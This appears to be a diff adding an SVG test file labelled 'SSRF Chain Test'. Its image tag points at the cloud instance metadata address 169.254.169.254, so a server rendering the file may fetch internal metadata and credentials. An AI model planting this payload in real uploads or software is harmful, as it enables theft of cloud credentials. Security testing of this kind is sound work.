@@ -1,0 +1,5 @@
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="400" height="200" viewBox="0 0 400 200">
+  <rect width="400" height="200" fill="#f0f0f0"/>
+  <text x="10" y="20" font-size="12">SSRF Chain Test</text>
+  <image href="http://169.254.169.254/latest/meta-data/" x="10" y="30" width="380" height="160"/>
+</svg>
